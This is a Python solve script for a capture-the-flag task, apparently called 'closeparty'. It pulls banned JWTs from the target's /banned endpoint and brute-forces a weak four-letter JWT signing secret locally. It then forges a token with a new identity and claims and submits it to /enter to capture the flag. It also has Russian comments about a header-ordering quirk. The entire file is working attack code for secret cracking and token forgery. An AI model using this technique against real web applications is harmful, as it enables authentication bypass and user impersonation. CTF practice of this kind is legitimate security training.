#!/usr/bin/env python


from flask import Flask
from flask_jwt_extended import create_access_token, JWTManager

import json
import string
import itertools
import base64

import requests

import sys
import time

if len(sys.argv) != 2:
    print("Usage: ./{} <ip:port>".format(sys.argv[0]))


print("[1] Setting up app")
app = Flask("task6_closeparty_solve")
app.config['JWT_TOKEN_LOCATION'] = ["cookies"]
jwt = JWTManager(app)

print("[2] Get banned tokens")
r = requests.get("http://{}/banned".format(sys.argv[1]))

print("[3] Parsing banned token #3 for actual token body and header")
correct_token = r.json()[2]
correct_header = correct_token.split('.')[0]
correct_body = correct_token.split('.')[1]

# From a theoretical point of view, the padding character is not needed, 
# since the number of missing bytes can be calculated from the number of Base64 digits.
correct_body += '=' * (-len(correct_body) % 4)
correct_header += '=' * (-len(correct_header) % 4)


original_claims = json.loads(base64.b64decode(correct_body).decode())
original_header = json.loads(base64.b64decode(correct_header).decode())
solve_token = ''

# BUG
# Собственно, изначальный вариант - считать токен с /banned и проверять секрет по нему локально
# Но у меня почему-то менялось положение хедеров и подпись не совпадала.
# Т.е. вместо {"alg":"HS256","typ":"JWT"} у меня было {"typ":"JWT","alg":"HS256"}
# NOTE
# pip install pyjwt==2.9.0

with app.app_context():
    vars = [string.ascii_letters] * 4
    print("[4] Local brute force of JWT_SECRET_KEY started...")
    for token in itertools.product(*vars):
        token = ''.join(token)

        app.config["JWT_SECRET_KEY"] = token
        #print("\rTry:", app.config["JWT_SECRET_KEY"],end='' ) #Comment this line for better performance
    
        gen_token = create_access_token(identity="Seagull#6943", additional_claims=original_claims, additional_headers=original_header) 
        if correct_token == gen_token:

            solve_token = create_access_token(identity="Hackerman#1337", additional_claims={"Guest":"HackerCr4b#1337", "Status": "A"})
            print("\r[+] JWT_SECRET_KEY: {}\n    Token:{}".format(token, solve_token))
            break
    
    print("[5] Capture a flag from task:")
    r = requests.get("http://{}/enter".format(sys.argv[1]), cookies={'access_token_cookie':solve_token})
    print(r.text)

    print("Done.")
